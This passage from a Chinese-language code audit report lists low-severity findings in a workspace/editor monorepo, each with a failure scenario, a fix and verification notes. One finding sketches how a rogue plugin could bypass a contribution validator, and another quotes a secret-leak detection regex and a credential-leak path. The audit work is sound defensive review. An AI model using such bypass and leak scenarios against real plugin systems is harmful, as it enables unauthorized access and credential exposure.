**失败场景**: 以 `target: { kind: 'component-document', nextPath: '/pages/ Button.pir.json' }`(用户输入的、带前导空格的文件名)重命名一个 pir-component。`workspaceVfsIntent.normalizePath` 只对整个字符串做 trim,不处理各个路径片段,因此返回 `/pages/ Button.pir.json`;`renameDocument` 把 VFS 节点名设置为 `' Button.pir.json'`;`createWorkspaceVfsIntentCommandPlan` 返回一个未经校验的计划,于是 planner 返回 `status:'ready'`。当该 Transaction 稍后被应用时,`validateWorkspaceVfs` 的 `isCanonicalNodeName` 会以 `WKS_NODE_NAME_INVALID` 拒绝它(`name !== name.trim()`),因此该操作在 History/Outbox 阶段以一个无关的底层错误失败,而不是在计划阶段就被拒绝。同一个漏洞也会接受 `nextPath: '/.prodivix/Button.pir.json'`,而 `isCanonicalWorkspaceDocumentPath` 只在应用阶段才拒绝它。

**修复建议**: 要么把两处调用点都改为使用会校验的 `createWorkspaceVfsIntentPlan`,要么在返回 `status:'ready'` 之前先运行 `applyWorkspaceTransaction(input.workspace, transaction)` 并把其 issues 映射为 `vfsPlanFailed`,与 `createWorkspaceComponentExtractionTransactionPlan` 保持一致。

**验证备注**: 源码吻合:createWorkspaceVfsIntentCommandPlan(workspaceVfsIntent.ts:553)的文档说明它不选择校验策略,其会校验的同类 createWorkspaceVfsIntentPlan(第 612 行)会运行 applyWorkspaceCommand,而这个不校验边界仅有的两个消费方是 workspaceComponentImpactPlanner.ts:156(删除)和 :387(重命名);两者都不应用该 Transaction。normalizePath(第 44 行)只对整个字符串做 trim,因此带前导空格的路径片段会被保留。我通过临时在 workspaceComponentImpactPlanner.property.test.ts 中添加两个用例复现了该问题(已回退):nextPath '/components/ renamed-card.pir.json' -> status 'ready',applyWorkspaceTransaction 返回 ok:false 并带 WKS_NODE_NAME_INVALID;nextPath '/.prodivix/renamed-card.pir.json' -> status 'ready',应用时以 WKS_DOCUMENT_PATH_INVALID 失败。因此计划期与应用期之间的契约缺口是真实的。但严重级别被夸大:git grep 显示 createWorkspaceComponentRenameTransactionPlan / createWorkspaceComponentDeleteTransactionPlan 在 apps/ 或 packages/ 中都没有任何生产消费方 —— 它们只是从 packages/workspace/src/index.ts 再导出,并且只被本包自身的 property test 覆盖。而且下游边界是失败关闭的(applyWorkspaceTransaction 会带 issues 拒绝;任何非法内容都无法进入 History 或 Outbox,后者在入队前还会运行 planWorkspaceOperationCommit)。这是一个未被使用的导出 API 中的计划期校验/错误质量缺口,而非高严重级别的架构违规:low。

##### L-ARCH-03 根路由节点上的 runtime loader/action/guard 永远得不到 code slot 或绑定 projection

- **位置**: [`packages/router/src/routeCodeSlotProvider.ts:99`](packages/router/src/routeCodeSlotProvider.ts#L99)
- **类别**: architecture-invariant ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-workspace-sync-router`

**详情**: `createRouteRuntimeCodeSlotProvider` 通过 `flattenRouteManifest(manifest)` 枚举路由,而该函数会无条件跳过 id 恰为字面量 `'root'` 的任何节点(routeCore.ts:339)。RouteManifest codec _要求_ `manifest.root.id === 'root'`(routeCodec.ts:337-342),因此宿主根节点始终被排除。结果是既不会创建 `route.root.loader` / `route.root.action` / `route.root.guard` slot,也不会为 `manifest.root.runtime` 产出 `CodeSlotBindingProjection`。与此同时,同一事实的另外两个所有者都处理了根节点:`validateRouteManifest` 会校验 `manifest.root.runtime` 的引用并发出 RTE-2010/RTE-2011(routeCore.ts:1186-1208, 1230),`createRouteSemanticContributionProvider` 也会通过 `contributeRouteTree(facts, manifest.root, ...)` 为根节点发出 `route-runtime-artifact-reference` 事实(routeSemanticContributionProvider.ts:521)。`flattenRouteManifest` 的其他调用方都显式补偿了这一根节点排除(routeCore.ts:545, 866, 971);唯独这里没有。该 provider 在 `packages/workspace/src/authoring/createWorkspaceCodeSlotRegistryFromSnapshot.ts:47` 处按 Workspace 全局注册。

**失败场景**: 某 Workspace 在根路由上声明了应用级别的鉴权 guard:`routeManifest.root.runtime = { guardRef: { artifactId: 'code-auth-guard' } }`。`createWorkspaceCodeSlotRegistryFromSnapshot(snapshot)` 注册了路由 provider,但 `registry.getSlot('route.root.guard')` 返回 `null`,`listBindingProjections({...})` 也永远不会产出该 guard 绑定,因此 Inspector/代码编辑器/Issues 界面无法展示、跳转或重新绑定它。与此同时,Semantic Index 中对 routeNodeId `'root'` 保存着一条指向 `code-auth-guard` 的 `requiresDurableTarget` code reference。删除 `code-auth-guard` 会产生一条无法解析的语义引用,而没有任何 code slot 可用于重新绑定或清除它。

**修复建议**: 显式纳入 manifest 根节点,参照别处使用的补偿方式,例如 `const routes = [{ id: manifest.root.id, node: manifest.root, path: '/', depth: 0, label: '/' }, ...flattenRouteManifest(manifest), ...]`,或者给 `flattenRouteManifest` 增加 `includeRoot` 选项并在此处使用。

**验证备注**: 证据吻合(routeCodeSlotProvider.ts:98-103、routeCore.ts:339 `if (node.id !== 'root')`、routeCodec.ts:337-342 强制根 id === 'root')。我以 root.runtime.guardRef={artifactId:'code-auth-guard'} 及一个自带 guardRef 的子路由执行了 createRouteRuntimeCodeSlotProvider('ws-1', manifest):getSlot('route.root.guard') 返回 null,listBindingProjections({}) 只包含子路由绑定 —— 根 guard 既没有产生 slot 也没有产生 projection,而子路由两者都有。与其他所有者之间的不对称是真实的:validateRouteManifest 会遍历 manifest.root(routeCore.ts:1150-1230,为根 runtime 引用发出 RTE-2010/2011),contributeRouteTree 也是以 manifest.root 调用的,而 flattenRouteManifest 的其他调用方都显式重新加回了根节点(routeCore.ts:544, 866, 971)。严重级别由 medium 下调为 low:根节点在所有同样基于 flattenRouteManifest 派生的编辑器路由界面中都被统一排除 —— 包括 useBlueprintEditorInspectorController.ts:602/626-628 处的 Inspector 路由 runtime 界面 —— 因此根 runtime 引用根本无法通过产品 UI 创作;该缺口只在通过 wire/导入写入的 manifest 上才会显现,属于所有者一致性缺陷,而非面向用户的功能回归。

##### L-ARCH-04 执行 snapshot 身份存在两个所有者:apps/web 重新实现了 createWorkspaceExecutionSnapshotRef,且两份副本已经出现分歧

- **位置**: [`apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts:38`](apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts#L38)
- **类别**: architecture-invariant ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-core`

**详情**: `createWorkspaceExecutionSnapshotRef` 是规范的、传输中立的 revision 围栏:它的 `snapshotId` 被嵌入隔离 Server Function runner 配置(isolatedServerFunctionProject.ts:559、581),并由 worker 的权限检查(`readIsolatedServerFunctionExecutionContext`,server-runtime)和 Issues provider(`apps/web/.../workspaceIssueProviders.ts:345`)按相等性比较。`apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts:38` 包含同一函数的第二份独立实现,而 apps/web _两者都在用_:`workspaceIssueProviders.ts:27` 导入编译器版本,而 `animationExecutionClient.ts:98` 和 `nodeGraphExecutionClient.ts:81` 使用本地副本。两者已经不再完全一致 —— 编译器基于按 id 排序的文档构建 `partitionRevisions`(第 134-155 行),而 web 副本对 `Object.values(workspace.docsById)` 不排序直接遍历(workspaceExecutionIdentity.ts:31)。这违反了“应用不得重新拥有传输中立领域契约”的规则,而且没有任何测试把这两个公式绑定在一起。

**失败场景**: 今后只要对其中一个文件的 `snapshotId` 模板做修改而不同步另一个(例如新增一个分区、改变分隔符,或把文档排序换成码点比较器),`collectExecutionSessionIssueSnapshot` 计算出的 `expectedSnapshotId` 就永远不会等于 `animationExecutionClient`/`nodeGraphExecutionClient` 写入的 `record.snapshotId`。该比较是一个静默失败的过滤器(`record.snapshotId !== expectedSnapshotId` -> `return []`),因此所有执行诊断都会从 Issues 面板消失且不暴露任何错误,而按一套公式签发的隔离 Server Function 权限令牌在另一套公式下会被判为 `SVR_AUTHORITY_INVALID` 而遭拒。

**修复建议**: 从 `apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts` 中删除 `createWorkspaceExecutionSnapshotId` / `createWorkspaceExecutionPartitionRevisions` / `createWorkspaceExecutionSnapshotRef`,让 `animationExecutionClient.ts` 和 `nodeGraphExecutionClient.ts` 从 `@prodivix/prodivix-compiler` 引入唯一的所有者(只保留确实属于浏览器本地的 `createClientExecutionRequestId`)。

**验证备注**: 部分确认,严重级别下调。成立的部分:引用证据与 workspaceExecutableProject.ts:131-136 逐字一致;同一传输中立契约的第二份实现确实存在于 apps/web/src/editor/features/execution/workspaceExecutionIdentity.ts:38(以及 createWorkspaceExecutionSnapshotId:11 和 createWorkspaceExecutionPartitionRevisions:24);apps/web 声明了 '@prodivix/prodivix-compiler': 'workspace:*'(package.json:60),因此没有任何因素迫使它复制一份;两个所有者在同一个应用中同时生效(编译器版本见 workspaceIssueProviders.ts:27/345;本地副本见 animationExecutionClient.ts:98、nodeGraphExecutionClient.ts:81、ExecutionCenter.tsx:242、workspaceExecutionSourceNavigation.ts:26);两者在生产代码中确实被交叉比较(projectTestExecutionPlan.ts:190 把**编译器**签发的 ref 放到请求上,ExecutionCenter.tsx:242 随后把它与 **web** 计算出的 id 相比较);并且没有测试把它们绑定在一起 —— workspaceIssueProviders.test.ts:424 在比较的两侧都使用编译器版本。这确实是不变量 9 之下 revision 围栏的重复所有者问题。被推翻的部分:(a)“两者已经不再完全一致”对于该失败所依赖的那个字段而言并不成立 —— 我比对了两份 snapshotId 公式,它们逐字节相同(都按 left.id.localeCompare(right.id) 对 Object.values(docsById) 排序,元素同为 encodeURIComponent(id)@contentRev.metaRev,同用 ',' 连接,模板同为 `${id}|w=|r=|o=|d=`)。所引用的差异只是 partitionRevisions 的键**插入顺序**,那是另一个字段。(b)该顺序差异不可观测:createExecutionRequest 通过 normalizeStringRecord 对分区键排序(executionRequest.ts:58-70),而两处 web 调用点都把 ref 直接喂给它(animationExecutionClient.ts:94、nodeGraphExecutionClient.ts:77);normalizeExecutableProjectWorkspaceRef 也会排序(executableProjectNormalization.ts:683-695);worker 的 workspaceRefMatches 在 JSON.stringify 之前排序(rootlessPodmanSandbox.ts:709-720);Go store 则通过 map 往返。projectTestExecutionClient.ts:61 用 JSON.stringify 比较 partitionRevisions,但两侧都来自编译器 ref。(c)SVR_AUTHORITY_INVALID 这条线不可达:隔离 server function 的 snapshotId 由编译器签发(isolatedServerFunctionProject.ts:559/581),并在 isolatedServerRuntime.ts:324 与 request.workspace.snapshotId 比较;web 副本的调用点都是 runtimeZone:'client',永远不会进入该路径。结论:潜在的重复所有者/未被测试绑定的缺陷,当前可观测影响为零 —— 所描述的数据丢失失败需要今后对其中一份副本做假设性的修改,因此 'medium' 属于夸大。

#### 4.4.9 状态完整性(state-integrity)

##### L-SI-01 外部库变更持久化失败时,UI 仍会显示 Workspace 从未接受过的状态

- **位置**: [`apps/web/src/editor/features/resources/ExternalLibraryManager.tsx:257`](apps/web/src/editor/features/resources/ExternalLibraryManager.tsx#L257)
- **类别**: state-integrity ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-resources-issues`

**详情**: `updateExternalResourceValue` 会乐观地修改 React 状态(`setActiveLibraries`、`setConfiguredComponentLibraryIds`、`setConfiguredIconLibraryIds`,并通过 `applyConfiguredIconLibraryIds` 修改全局渲染器图标注册表),然后再串接 Workspace 写入。被拒绝的写入(`persistExternalResourceValue` 在第 224/241 行抛出,或在第 203 行因 Workspace 只读而提前返回)会被捕获,却只做 `console.warn`。`finally` 会依据 canonical Workspace 重置 `latestExternalResourceValueRef`,但驱动列表的组件状态从未被对账,于是 UI 和渲染器已配置的图标库与 canonical Workspace 产生分歧,且没有任何用户可见的信号。

**失败场景**: 在只读 Workspace 中(或在 revision 漂移导致拒绝之后),用户从外部库列表里移除 `@mui/material`。该行消失,`setConfiguredComponentLibraryIds` 把它剔除,`iconRegistry.setConfiguredIconLibraryIds` 也被更新,但 `persistExternalResourceValue` 提前返回或抛出,因此 `/config/external-libraries.json` 毫无变化。用户看到的是一份在 Workspace 中并不存在、并且会在下次重新加载时静默重现的库集合,而唯一的证据只有一条 `console.warn`。

**修复建议**: 在面板中暴露该失败(在 `adapterError` 旁边加一个错误状态),并在持久化失败后依据 `buildExternalLibrariesValueFromWorkspace(currentWorkspace.docsById)` 重新推导 `activeLibraries`/`configured*LibraryIds`,使 UI 与 canonical Workspace 保持一致。

**验证备注**: 证据与 ExternalLibraryManager.tsx:253-272 吻合。removeLibrary/addLibrary/updateLibraryVersion/changeMode 都会先修改 React 状态(applyConfiguredIconLibraryIds 还会在第 193-195 行把变更推入全局 pir-react-renderer 图标注册表)再串接写入,而失败的唯一处理是第 258 行的 `console.warn`。persistExternalResourceValue 在只读时提前返回(第 203-205 行,这条路径比所述的还要安静——连 warn 都没有),并在第 224/241 行抛出。我核查过是否存在对账逻辑:引导 effect(第 630-687 行)以 `externalResourceValue` 为依赖,而后者是基于 `workspace.docsById` 的 useMemo;写入失败会让 docsById 保持不变,于是该 memo 和 effect 都不会重新运行,组件状态维持分歧。严重度下调:canonical Workspace 从未被破坏,`latestExternalResourceValueRef` 会在 finally 中依据 canonical 重新播种,因此后续成功的写入是基于 canonical 构建的(不会静默写入错误数据),而分歧会在下一次 workspace 变更或重新加载时自愈。这是 UI/运行时投影的无信号分歧,而不是持久化完整性缺陷。

##### L-SI-02 稳定 id 数组的顺序对合并比较器不可见,且总是取自远端,静默丢弃本地的重排序

- **位置**: [`packages/workspace-sync/src/jsonValue.ts:113`](packages/workspace-sync/src/jsonValue.ts#L113)
- **类别**: state-integrity ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-architecture`

**详情**: `semanticJsonValuesEqual` 会把 JSON 指针最后一段属于 `STABLE_ID_ARRAY_FIELDS`(`bindings`、`edges`、`graphs`、`groups`、`keyframes`、`nodes`、`primitives`、`svgFilters`、`timelines`、`tracks`)的每一个数组都当作按 id 索引的映射,只比较 id 集合与逐 id 的值 —— 元素顺序从不参与比较。`workspaceThreeWay.ts:250-252` 在快速路径中使用该比较器,因此一次纯粹的本地重排序会被读作 `statesEqual(local, base) === true`,合并结果返回远端值。即便 `mergeStableArrayStates` 真的执行,其结果顺序也是 `[...remoteCollection.order, ...localCollection.order, ...baseCollection.order]` 去重后的结果(workspaceThreeWay.ts:233-237),也就是远端顺序永远胜出。最终效果是:这些数组的顺序永远无法被合并,也永远不会引发冲突,因此本地的排序编辑会在没有任何诊断的情况下丢失。对 `svgFilters[].primitives` 而言这在语义上具有破坏性:SVG filter primitive 按文档顺序生效,而 `in` 是可选的(packages/animation/src/animation.types.ts:60-79),因此重排序会改变渲染结果。

**失败场景**: 某个 animation 文档有 `svgFilters[0].primitives = [P1(feGaussianBlur), P2(feColorMatrix)]`,且没有显式的 `in`/`result` 链接。作者在本地把它们重排为 `[P2, P1]`,以便在色彩矩阵之后再做模糊。与此同时另一个会话修改了 `P1.attrs.stdDeviation`。在 rebase 时,`/svgFilters` 处的 `mergeValueStates` 发现 `statesEqual(local, remote)` 为 false,但 `statesEqual(local, base)` 为 true(顺序被忽略),于是返回 `cloneJsonValue(remote)`。作者的重排序被丢弃,`conflicts` 保持为空,`autoRebaseWorkspaceSnapshots` 以 `ok:true` 报告 `status:'rebased'`,workspace 静默回退到旧的 filter 链顺序,且没有任何冲突提交给评审。

**修复建议**: 在 `semanticJsonValuesEqual` 中除了 id 集合之外还要比较 id 的顺序(或者把映射式处理限定在顺序可证明无语义的字段上,并把 `primitives`/`keyframes`/`tracks` 当作有序数组处理)。当本地与远端都相对 base 发生了重排序时,`mergeStableArrayStates` 应通过 `chooseConflictState` 抛出 `structural` 冲突,而不是静默偏向 `remoteCollection.order`。

**验证备注**: 机制已验证并复现,但破坏性场景不可达,因此必须下调严重程度。代码一致:STABLE_ID_ARRAY_FIELDS(jsonValue.ts:45-56)包含 primitives/svgFilters/nodes/edges 等,semanticJsonValuesEqual 只比较 id 集合与逐 id 的值(jsonValue.ts:107-140),mergeStableArrayStates 把顺序构建为 [...remote.order, ...local.order, ...base.order] 去重(workspaceThreeWay.ts:232-237)。我写的一次性 vitest 证实了结果:base 的 nodes 为 [node-a,node-b],本地反转,远端修改 node-a.data.label -> autoRebaseWorkspaceSnapshots 返回 ok:true、status 'already-applied'、合并后的 nodes 为 ['node-a','node-b']、conflicts 为 0 —— 本地重排序被静默丢弃,outbox 条目甚至被视为已应用。但所声称的失败场景(svgFilters primitive 重排序改变 SVG filter 链语义)没有生产触发路径:apps/web/src/editor/features/animation/useAnimationEditorState.ts 只暴露 addSvgPrimitive(追加)、deleteSvgPrimitive(过滤)、updateSvgPrimitiveType(映射)—— 任何地方都没有 move/reorder API,而在 packages/animation、packages/nodegraph 以及 animation/development 编辑器中执行 `git grep splice(` 也没有结果,因此也不存在中间插入。其他稳定 id 字段在实践中对顺序不敏感:keyframes 会在 animationCodec.ts:252 和 animationAuthoring.ts:41 按时间重新排序;nodes/edges 是图集合。仓库自身的测试(packages/workspace-sync/src/**tests**/workspaceOperationCommit.test.ts:122)确实把重排序当作精确的持久内容变更,因此合并层的这个缺口是值得修复的真实缺陷 —— 但由于目前不存在可达的、顺序具有语义的重排序路径,其影响是理论性的,而非静默的渲染损坏。

#### 4.4.10 测试覆盖(test-coverage)

##### L-TC-01 测试把本地构造的字面量与其自身比较,未执行任何生产代码

- **位置**: [`packages/authoring/src/authoringRegistries.test.ts:129`](packages/authoring/src/authoringRegistries.test.ts#L129)
- **类别**: test-coverage ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-authoring-lang`

**详情**: 名为 `uses artifact identity instead of a path in persisted code references` 的测试构造了一个 `CodeReference` 对象字面量,然后断言它深度等于同一个字面量,并断言 `'path' in reference` 为 false——两者都是对测试自己刚写下的字面量的同义反复。它没有调用 `packages/authoring` 中的任何函数、注册表、编解码器或不变式,因此无论生产代码中 `CodeReference` 的处理方式如何变化,该测试都永远不会失败。其意图(持久化的代码引用应通过 id 而非路径寻址 artifact)是一个类型层面的约束,运行时断言无法检查它。

**失败场景**: 如果将来某次改动重新在持久化的代码引用上引入 `path` 字段——例如某个 slot provider 或编解码器把 `{ artifactId, path, exportName }` 写入 Workspace 文档——该测试仍会通过,因为它只检查自己的字面量,从不触及生产代码。测试套件为一个它实际并未守护的不变式报告了覆盖率。

**修复建议**: 要么删除该测试,要么让它断言真实输出——例如通过 `createCodeSlotRegistry().listBindingProjectionsByArtifact(...)` 驱动一个 `CodeSlotProvider`,并断言返回的 `binding.reference` 的键,使得一个添加了 path 字段的生产者确实会让测试失败。

**验证备注**: 引用证据与 packages/authoring/src/authoringRegistries.test.ts:129-142 原样吻合。测试体没有调用该包的任何运行时导出:CodeReference 通过 'import type { CodeReference } from "."'(第 15 行)引入,而 TypeScript 会将其擦除,因此 packages/authoring 中没有任何代码被执行。expect(reference).toEqual({相同字面量}) 是把字面量与其自身的副本比较,而 'path' in reference 必然为 false,因为测试刚写下的字面量本就没有 path 键。两条断言都是同义反复,不可能失败。已核实 packages/authoring/src/authoring.types.ts:96 处的类型为 { artifactId; exportName?; symbolId?; sourceSpan? },没有 path,并且它是普通(非精确)TS 对象类型,因此审查者的场景成立:新增一个可选的 path 加上一个把它写入 Workspace 文档的编解码器或 slot provider,会让该测试依旧通过。审查者遗漏了一个我已核实、能削弱但不能推翻该结论的缓解因素:`const reference: CodeReference` 的类型注解是一条真实的编译期断言,因此若把 path 改为必填字段,该文件的 tsc 会失败。运行时测试仍未守护关于持久化引用的任何性质,而所指的不变式在该包中也没有其他覆盖。仅属测试卫生问题,无生产影响,因此 low 是正确的。

##### L-TC-02 诊断测试中的机密泄露断言是同义反复,毫无覆盖价值

- **位置**: [`packages/plugin-contracts/src/__tests__/diagnostics.test.ts:64`](packages/plugin-contracts/src/__tests__/diagnostics.test.ts#L64)
- **类别**: test-coverage ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-protocol-contracts`

**详情**: 名为 'builds stable docs URLs without exposing unsafe metadata' 的测试对三行之前由完全字面、无机密的输入(`protocolMethod: 'document/read'`、`contractVersion: '1.0'`、消息 'Gateway request is invalid.')构造出的诊断断言 `expect(JSON.stringify(diagnostic)).not.toMatch(/secret|token|body/i)`。被测代码中没有任何路径能让该断言失败。`createPluginDiagnostic`(diagnostics.ts:600-620)完全不做脱敏——它把调用方提供的 `meta` 原样展开进诊断——因此这条测试看似守护的架构不变式(机密值绝不能进入诊断)实际上完全没有被强制执行,也完全没有被测试。

**失败场景**: 有人新增一条 Gateway 错误路径,把请求头映射或某个 `Authorization` 值传入 `createPluginDiagnostic(..., { ...requestMeta })`。meta 被原样展开,机密进入 Issues 面板和任何诊断汇聚点,而该测试依然通过,因为它只序列化自己硬编码的固定装置。

**修复建议**: 要么去掉这条断言(它只是 docsUrl 测试上的装饰),要么让它变成真实测试:给 `createPluginDiagnostic` 传入真正含有机密形态键/值的 meta 对象,并断言生成的诊断丢弃或脱敏了它们——这需要在 `createPluginDiagnostic` 本身加入允许列表/脱敏步骤。

**验证备注**: 证据与源码完全吻合:diagnostics.test.ts:64 为 `expect(JSON.stringify(diagnostic)).not.toMatch(/secret|token|body/i);`,作用于第 49-53 行由纯字面、无机密输入构造的诊断。已确认 createPluginDiagnostic(diagnostics.ts:600-620)将调用方 `meta` 原样展开(`meta: { ...meta, stage: definition.stage }`)且不做任何脱敏。没有任何守卫能阻止所述场景:PluginDiagnosticMeta(diagnostics.ts:101-137)以开放索引签名 `[key: string]: JsonValue | undefined` 结尾,因此任意键/值都能通过类型检查;wire schema 的 $defs.safeDiagnostic(specs/plugins/runtime/gateway-envelope-v1.schema.json)只把 meta 限制为 16 个标量属性,不做任何键名或值内容过滤;而插件栈中唯一的脱敏 redactGatewayAuditMetadata(packages/plugin-browser/src/gateway/audit/gatewayAudit.ts:87-101)作用于 GatewayAuditRecord.metadata,那是另一个字段,不是诊断 meta。两点措辞更正,但都不足以推翻该主张:(a)“被测代码中没有任何路径能让该断言失败”略有夸大,因为 `hint` 是来自 PLUGIN_DIAGNOSTIC_DEFINITIONS(diagnostics.ts:475-479)的生产数据,把该 hint 文本改成含 'body' 就会命中该正则——但这只说明该断言是对某条 hint 的意外字符串静态检查,而非脱敏测试,反而强化了该发现;(b)该不变式在审计路径上确实被强制执行并被真实测试覆盖(gatewayDispatcher.test.ts:691-702 传入真实的 'Bearer private' 固定装置并断言 [REDACTED]),因此它并非全局未强制,只是在诊断汇聚点未强制,而这正是审查者限定的范围。严重级别保持 low 且没有被夸大:今天不存在实际泄露——每一个生产调用方传入的都是有界的安全标量(例如 gatewayNetworkPolicy.ts:237-240 传入 `{ networkHeader: normalized }`,即请求头名称而非其值;各适配器处传入 networkOrigin/capabilityScope/limit),因此该失败需要将来的代码改动才会发生,这正是测试覆盖类发现的恰当定位。

#### 4.4.11 授权(authorization)

##### L-AUTHZ-01 当批次未声明外部库时插件贡献批次校验被完全跳过,使插件得以宣称他人拥有的 runtime 类型

- **位置**: [`apps/web/src/plugins/platform/contributions/contributionBatchValidator.ts:432`](apps/web/src/plugins/platform/contributions/contributionBatchValidator.ts#L432)
- **类别**: authorization ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-plugins-shell`

**详情**: 整个外部 Palette 归属检查块都被包在 `if (libraries.size > 0)` 之内。`libraries` 只包含*同一批次中*声明的外部库。当插件贡献了一个 `paletteContribution` 而没有 `externalLibrary` 时,该守卫为假,块内的每一项检查——针对未声明 `placement.libraryId` 的 `CONTRIBUTION_OWNERSHIP_MISMATCH`,以及针对某项 `runtimeType` 未被该库声明的 `INVALID_CONTRIBUTION_REFERENCE`——都不会执行。而这恰恰是第 439 行的诊断被编写出来所要捕获的场景,因此校验器在其主要场景上失败放行。后续的非 core 块(第 619 行)无法弥补:对于设置了 `runtimeType` 且没有绑定模板的项,`hasDirectRecipe === Boolean(template)` 计算为 `true === false`,不会发出任何诊断。

**失败场景**: 某个第三方(非 core)插件发布单个 `paletteContribution`,其分组带有 `placement: { section: 'external', libraryId: 'antd' }`,并含有一项 `{ id: 'evil-button', runtimeType: 'AntdButton' }`,同时不声明任何 `externalLibrary`。`validateWebContributionBatch` 返回成功且零诊断。随后 `createPaletteQueryService`(apps/web/src/plugins/platform/paletteQueryService.ts:89)注册 `creationRecipesByItemId['evil-button'] = { kind: 'direct', runtimeType: 'AntdButton' }`,因为非 core 包会解析为 `creationMode: 'contract'`(apps/web/src/editor/features/blueprint/palette/projectionResolver.ts:514),于是这个流氓插件获得了一个 palette 条目,可以创作绑定到它并不拥有的 Ant Design runtime 类型的节点。

**修复建议**: 删除 `if (libraries.size > 0)` 守卫,使 palette 分组循环始终执行;当外部 placement 的 `libraryId` 不在 `libraries` 中时必须始终产生 `CONTRIBUTION_OWNERSHIP_MISMATCH`,尤其包括批次完全未声明外部库的情形。

**验证备注**: 代码与引述完全一致:contributionBatchValidator.ts:432 将外部 palette 归属检查块包在 `if (libraries.size > 0)` 内,`libraries` 仅由同一批次中的 externalLibrary 描述符构建(第 98-166 行),而第 619-654 行的非 core 块无法弥补(设置了 runtimeType 且无模板 => hasDirectRecipe 为 true,Boolean(template) 为 false => 无诊断)。因此,一个含有 external section palette 分组且零声明库的批次会同时跳过 CONTRIBUTION_OWNERSHIP_MISMATCH(439)和 runtimeType 的 INVALID_CONTRIBUTION_REFERENCE(456)。严重级别由 high 下调为 low,因为所述的授权失败不可达:createPaletteContributionResolver.prepare(blueprint/palette/projectionResolver.ts:432-452)只有在找到进程内的 trustedBinding(bindProjection,仅由 createWebPluginPlatform.ts:239 在应用自身的 installTrustedPackage/installPalette 路径上调用)或 implementations.bind 成功时才会解析;而 bind 会以 OFFICIAL_IMPLEMENTATION_NOT_ATTESTED 失败,除非 publisherVerified 为 true、trustLevel 为 core/official(或 development 且 allowDevelopment),并且 pluginId+packageDigest 与构建期烘焙的目录相匹配(officialHostImplementations.ts:376-397;BUNDLED_OFFICIAL_HOST_MODULE_CATALOG)。真正的第三方插件永远无法注册 paletteContribution,因此 createPaletteQueryService 永远看不到那个流氓条目。此外该守卫只在零库这一子集上失败放行:当插件声明了其他库时,libraries.size > 0,归属不匹配会被捕获。残余价值在于对捆绑的官方插件中的创作失误提供纵深防御。

#### 4.4.12 资源管理(resource-management)

##### L-RL-06 硬编码的 5s store 截止时间被施加到 workspace 导入上,而 HTTP 层允许该请求携带约 134 MB 与 256 次 blob 插入

- **位置**: [`apps/backend/internal/modules/workspace/store_snapshot.go:144`](apps/backend/internal/modules/workspace/store_snapshot.go#L144)
- **类别**: resource-management ｜ **严重度**: Low ｜ **验证状态**: 存疑 ｜ **审查单元**: `be-workspace`

**详情**: `withStoreTimeout`(store_helpers.go:536-541)无条件地把调用方 context 包进 5 秒的 `context.WithTimeout`,而 `importWorkspaceSnapshot` 把它施加于整个导入事务。该事务会插入 project 行、workspace 行、route 行、settings 行、最多 `MaxWorkspaceAssetImportBlobCount` = 256 个 blob 行(总计 `MaxWorkspaceAssetImportTotalBlobBytes` = 128 MB 的 `bytea`),以及从一个自身可能达 4 MB 的 manifest 中解析出的每份文档各一次 INSERT。处理器为该请求明确预算了约 134 MB(`maxWorkspaceAssetImportRequestBytes`,handlers_asset_import.go:20-22)。由于该截止时间是在 store 内部创建的,任何调用方或配置都无法将其调高。因为超时在事务中途触发,整个导入会在客户端已经上传完所有内容之后回滚。

**失败场景**: 用户导入一个本地项目,其中包含 4 张各 32 MB 的图片(在所有已声明限制之内)。multipart 请求体被接受并缓冲,`normalizeWorkspaceAssetBlobImports` 通过,随后 `insertWorkspaceAssetBlobImports` 在一个 5 秒 context 内向 Postgres 流式写入 128 MB 的 bytea。在任何非平凡的数据库上(网络往返、WAL、TOAST 压缩),截止时间会到期,`tx.ExecContext` 返回 `context deadline exceeded`,事务回滚,`MapStoreError` 返回 HTTP 500 `API-9001`。无论重试多少次,该导入都永远无法成功。

**修复建议**: 把 store 截止时间参数化(例如带按操作预算的 `withStoreTimeout(ctx, d)`,或由配置设置的 `WorkspaceStore.timeout` 字段)。为 `importWorkspaceSnapshot` 提供一个由已接受字节预算推导出的预算(或者依赖 HTTP 服务器自身的写超时),而不是沿用为单行读取设定的 5s 上限。

**验证备注**: 所有代码事实都成立,我无法证伪其中任何一条:withStoreTimeout(store_helpers.go:536-541)无条件应用 context.WithTimeout(ctx, 5*time.Second)——这是正确的 Go 语义,派生截止时间只能缩短,因此任何调用方或配置都无法将其调高;store_snapshot.go:144 在 BeginTx 之前把它应用于整个导入事务;各项限制与引述一致(asset_blob.go:18-20:单个 blob 32 MB、256 个 blob、总计 128 MB),而 maxWorkspaceAssetImportRequestBytes(handlers_asset_import.go:20-22)确实预算了约 134 MB;insertWorkspaceAssetBlobImports(asset_blob.go:190-206)在该事务内为每个 blob 串行发起一次 ExecContext。我无法仅凭源码确立的是截止时间是否真的会被超出——而这正是整个论断所在。有两项事实与“永远无法成功”的表述相抵触:(a)multipart 请求体在调用 store *之前*就已被完整读取并做过摘要校验(decodeImportLocalProjectRequest,handlers_asset_import.go:133+),因此这 5 秒只覆盖数据库工作,不含上传时间;(b)驱动是经由 stdlib 的 pgx/v5(platform/database/database.go:21),它以二进制形式发送 []byte,因此线上传输约为 128 MB 而非十六进制翻倍后的 256 MB。5 秒内传 128 MB 需要持续约 26 MB/s,同机部署的 Postgres 可以轻松达到,而远程/托管实例可能达不到。能够定论的依据是:部署环境的数据库往返延迟与写入吞吐,以及实际有多少导入会逼近 128 MB 上限——这两点在仓库中都不可见。严重级别由 medium 修正为 low:最坏后果是一次以 500 呈现的回滚导入,原则上完全可重试,不存在部分写入(单一事务),也不会损坏数据。

#### 4.4.13 状态完整性(data-integrity)

